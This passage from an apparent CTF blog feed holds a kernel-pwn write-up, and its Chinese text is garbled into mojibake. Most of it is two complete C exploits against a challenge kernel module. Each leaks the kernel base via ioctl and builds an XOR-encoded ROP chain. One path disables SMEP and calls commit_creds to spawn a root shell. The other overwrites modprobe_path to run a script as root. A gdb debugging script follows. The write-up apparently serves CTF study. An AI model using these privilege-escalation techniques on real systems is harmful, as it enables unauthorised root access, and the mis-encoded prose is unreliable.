punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_READ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>content<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>content<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf[%d]: %lx\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>content<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> leak1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kbase</span><span class="token class-name">size_t</span> leak2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lkm</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak1<span class="token operator">-</span><span class="token number">0x713ec1</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> lkm <span class="token operator">=</span> leak2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff = 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] lkm = 0x%lx\n"</span><span class="token punctuation">,</span> lkm<span class="token punctuation">)</span><span class="token punctuation">;</span>commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span>init_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] commit_creds = 0x%lx\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] init_cred = 0x%lx\n"</span><span class="token punctuation">,</span> init_cred<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] swapgs_restore_regs_and_return_to_usermode = 0x%lx\n"</span><span class="token punctuation">,</span> swapgs_restore_regs_and_return_to_usermode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x6f0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_CR4_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>init_cred<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">0x36</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_WRITE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/7bd4daaa0c22cd99f92eeb95360c7069_MD5.jpeg"></p><p>å›¢é•¿çš„åšæ³•æ˜¯ä¿®æ”¹ modprobe_path æŒ‡å‘ææƒè„šæœ¬ï¼Œæ›´ç›´æ¥</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_READ</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_WRITE</span> <span class="token expression"><span class="token number">0xFEEDFACE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff81090c80</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RSI_RET</span> <span class="token expression"><span class="token number">0xffffffff811cc553</span><span class="token operator">+</span>koff</span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">modprobe_getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/xx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/tmp/fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo [*] modprobe: `cat /proc/sys/kernel/modprobe`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> modprobe_path<span class="token operator">=</span><span class="token number">0xffffffff82864fc0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81c00ff0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/test"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc"</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_READ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>content<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>content<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf[%d]: %lx\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>content<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> leak1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kbase</span><span class="token class-name">size_t</span> leak2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lkm</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak1<span class="token operator">-</span><span class="token number">0x713ec1</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> lkm <span class="token operator">=</span> leak2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff = 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] lkm = 0x%lx\n"</span><span class="token punctuation">,</span> lkm<span class="token punctuation">)</span><span class="token punctuation">;</span>modprobe_path<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] modprobe_path = 0x%lx\n"</span><span class="token punctuation">,</span> modprobe_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/tmp/xx"</span><span class="token punctuation">;</span><span class="token comment">//0xffffffff8107c550 : mov qword ptr [rdi], rsi ; jmp 0xffffffff81e02640</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>modprobe_path<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RSI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span>target<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xffffffff8107c550</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">0x36</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>modprobe_getflag<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_WRITE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/c7853eaab2a7f09c4eb4a8fe4a2f3804_MD5.jpeg"></p><p>åŠ¨è°ƒè„šæœ¬</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>gdb <span class="token parameter variable">-q</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">""</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"file ./vmlinux"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"set \<span class="token variable">$kobase</span> = 0xffffffffc0068000"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"add-symbol-file ./rootfs/lib/modules/5.10.0-9-generic/kernel/test.ko \<span class="token variable">$kobase</span> "</span><span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"b *(\<span class="token variable">$kobase</span>+0x0000000000000282)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Emojiï¼šæš‚å­˜"><a href="#Emojiï¼šæš‚å­˜" class="headerlink" title="Emojiï¼šæš‚å­˜"></a>Emojiï¼šæš‚å­˜</h1>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> èµ›é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024åä¸­èµ›åŒºé€‰æ‹”èµ›</title>
      <link href="/2024/06/21/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2024/06/21/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
